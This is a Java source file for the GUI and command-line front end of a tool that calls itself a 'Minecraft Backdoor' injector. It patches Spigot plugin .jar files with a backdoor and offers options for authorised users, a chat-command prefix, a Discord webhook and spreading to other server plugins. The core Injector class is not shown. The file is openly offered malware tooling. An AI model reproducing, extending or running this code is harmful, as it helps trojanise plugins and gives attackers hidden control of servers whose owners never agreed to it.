package com.thiccindustries.debugger;

import javax.swing.*;
import javax.swing.filechooser.FileFilter;
import java.io.File;
import java.util.Dictionary;
import java.util.Hashtable;
import java.util.Locale;

import com.formdev.flatlaf.FlatIntelliJLaf;
import org.apache.commons.lang.RandomStringUtils;

public class InjectorGUI{

    public static void main(String[] args){
        //Command line mode
        if(args.length != 0){
            commandLineMode(args);
            return;
        }


        try {
            UIManager.setLookAndFeel(new FlatIntelliJLaf());
        }catch(Throwable ignored){}

        int result = 999;
        while(result != JOptionPane.YES_OPTION) {
            /*--- Home dialog ---*/
            String[] options = {"Inject", "About", "Close"};
            result = JOptionPane.showOptionDialog(
                    null,
                    "Zeroed Industries' Minecraft Backdoor.\n" +
                            "Requirements:\n" +
                            "   * Minecraft UUID\n" +
                            "   * Target plugin .jar file",
                    "Zeroed Industries Injector",
                    JOptionPane.YES_NO_CANCEL_OPTION,
                    JOptionPane.PLAIN_MESSAGE,
                    null,       //no custom icon
                    options,        //button titles
                    options[0]      //default button
            );

            if (result == JOptionPane.NO_OPTION) {
                JOptionPane.showMessageDialog(
                        null,
                        "Created by: Zeroed Industries,\n" +
                                "Additional features by: @DarkReaper231, @ahdplayer, @progmem-cc\n" +
                                "Backdoor Version: 3.6.0\n" +
                                "Release Date: May 28 2025\n" +
                                "License: GPL v3.0",
                        "Zeroed Industries Injector",
                        JOptionPane.INFORMATION_MESSAGE
                );
            }

            if(result == JOptionPane.CANCEL_OPTION)
                return;
        }

        /*--- Get Files ---*/
        JFileChooser fc = new JFileChooser();
        fc.setFileFilter(new FileFilter() {
            @Override
            public boolean accept(File file) {
                return file.getName().endsWith(".jar") || file.isDirectory();
            }

            @Override
            public String getDescription() {
                return "Spigot Plugin File (*.jar)";
            }
        });

        int result1 = fc.showOpenDialog(null);

        //Out dialog cancelled
        if(result1 != JFileChooser.APPROVE_OPTION)
            return;

        String InPath = fc.getSelectedFile().getPath();

        int sep = InPath.lastIndexOf(".");
        String OutPath = InPath.substring(0, sep) + "-patched.jar";

        /*--- Query options ---*/
        Boolean UUIDsAreUsernames;
        String UUIDList;
        String ChatPrefix;
        Boolean InjectOther;
        Boolean Warnings;
        String discord = "";

        int usernames = JOptionPane.showConfirmDialog(null, "Use offline mode? (Usernames)", "Zeroed Industries Injector", JOptionPane.YES_NO_OPTION);
        UUIDsAreUsernames = usernames == JOptionPane.YES_OPTION;

        UUIDList = (String)JOptionPane.showInputDialog(
                null,
                "Minecraft " + (UUIDsAreUsernames ? "Usernames" : "UUIDs") + ":\n[Separate by commas]\n[Leave blank to disable authorization]",
                "Zeroed Industries Injector",
                JOptionPane.PLAIN_MESSAGE,
                null,
                null,
                ""
        );


        ChatPrefix = (String)JOptionPane.showInputDialog(
                null,
                "Chat Command Prefix:",
                "Zeroed Industries Injector",
                JOptionPane.PLAIN_MESSAGE,
                null,
                null,
                "#"
        );

        //No input
        if(ChatPrefix.isEmpty())
            return;

        discord = (String)JOptionPane.showInputDialog(
                null,
                "Discord webhook\n[Leave blank to disable, disable recommended]",
                "Zeroed Industries Injector",
                JOptionPane.PLAIN_MESSAGE,
                null,
                null,
                ""
        );

        InjectOther = JOptionPane.showConfirmDialog(
                null,
                "Inject to other plugins?\n[This feature is experimental (not working yet)]",
                "Zeroed Industries Injector",
                JOptionPane.YES_NO_OPTION
        ) == JOptionPane.YES_OPTION;

        Warnings = JOptionPane.showConfirmDialog(
                null,
                "Enable Debug Messages?\n[Please use this for github issues]",
                "Zeroed Industries Injector",
                JOptionPane.YES_NO_OPTION
        ) == JOptionPane.YES_OPTION;
        //Parse uuids

        String[] splitUUID = UUIDList.split(",");

        Injector.SimpleConfig sc = new Injector.SimpleConfig(UUIDsAreUsernames, splitUUID, ChatPrefix, discord, InjectOther, Warnings);
        boolean result2 = Injector.patchFile(InPath, OutPath, sc, true, true, true);

        if(result2){
            JOptionPane.showMessageDialog(null, "Backdoor injection complete.\nIf this project helped you, considering starring it on GitHub.", "Zeroed Industries Injector", JOptionPane.INFORMATION_MESSAGE);
        }else{
            JOptionPane.showMessageDialog(null, "Backdoor injection failed.\nPlease create a GitHub issue report if necessary.\nPlease run the injector again with debug messages on before submitting issues.", "Zeroed Industries Injector", JOptionPane.ERROR_MESSAGE);
        }
    }

    private static void commandLineMode(String[] args) {

        if(args[0].equals("--help") || args[0].equals("-h")){
            System.out.println("Java -jar backdoor.jar (filename) [options]\n" +
                    "--help / -h: Display syntax help\n" +
                    "--offline / -o: Use username authentication (Offline mode servers)\n" +
                    "--users / -u: Only allow specified UUID/Usernames to use backdoor commands (Separate by commas)\n" +
                    "--prefix / -p: Command prefix (default: #)\n" +
                    "--discord / -d: Discord webhook (See readme)\n" +
                    "--spread / -s : Spread to other server plugins\n" +
                    "--debug / -b: Display debug messages in console");
            return;
        }

        //default values
        Injector.SimpleConfig options = new Injector.SimpleConfig(false, new String[]{""}, "#", "", false, false);

        for(int i = 1; i < args.length; ++i){
            System.out.println(args[i]);
            if(args[i].startsWith("-")){
                System.out.println("pringle " + args[i]);
                if(args[i].equals("--offline") || args[i].equals("-o")) {
                    options.useUsernames = true;
                    continue;
                }
                if(args[i].equals("--debug") || args[i].equals("-b")) {
                    options.warnings = true;
                    continue;
                }
                if(args[i].equals("--spread") || args[i].equals("-s")) {
                    options.injectOther = true;
                    continue;
                }

                if(args[i].equals("--users") || args[i].equals("-u")) {
                    options.UUID = args[i + 1].split(",");
                    continue;
                }
                if(args[i].equals("--prefix") || args[i].equals("-p")) {
                    options.prefix = args[i + 1];
                    continue;
                }
                if(args[i].equals("--discord") || args[i].equals("-d")) {
                    options.discord = args[i + 1];
                    continue;
                }
            }
        }

        int sep = args[0].lastIndexOf(".");
        String OutPath = args[0].substring(0, sep) + "-patched.jar";
        boolean result = Injector.patchFile(args[0], OutPath, options, true, true, true);
        System.out.println("Backdoor injection " + (result ? "success." : "failed."));
    }

    public static void displayError(String message){
        JOptionPane.showMessageDialog(null, message, "Zeroed Industries", JOptionPane.ERROR_MESSAGE);
    }
}
